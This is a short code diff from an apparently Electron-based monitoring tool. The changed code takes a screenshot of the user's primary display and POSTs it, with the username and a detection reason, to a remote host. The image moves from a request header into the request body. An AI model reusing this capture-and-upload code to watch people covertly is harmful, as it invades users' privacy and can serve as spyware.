@@ -84,6 +84,7 @@ if (!process.env.path || !process.env.whitelisted) {
         MainWindow.close();
     MainWindow = await startWindow(); MainWindow.show();
 
+    console.log(JSON.stringify({ status: true }));
     app.addListener("activate", async () => {
         if (MainWindow)
             MainWindow.close();
@@ -111,17 +112,17 @@ if (!process.env.path || !process.env.whitelisted) {
                     fetchWindowIcons: true, thumbnailSize: screen.getPrimaryDisplay().size
                 }));
 
-                let _ss; if (ss.length > 0) {
+                let image; if (ss.length > 0) {
                     const capture = ss.at(0).thumbnail
-                        .resize({ width: 1980, height: 1080, quality: "good" }); _ss = capture.toPNG().toString("base64url");
+                        .resize({ width: 1980, height: 1080, quality: "good" }); image = capture.toPNG().toString("base64");
                 };
 
                 fetch(`http://${host}/api/status/update?user=${username}&reason=${result.name}`, {
+                    body: image,
                     method: "POST",
                     headers: {
                         "x-version": version,
-                        "x-user-agent": userAgent,
-                        "x-blacklist-data": `${JSON.stringify([_ss])}`
+                        "x-user-agent": userAgent
                     }
                 }).then(async res => {
                     if ((await res.json()).status) {
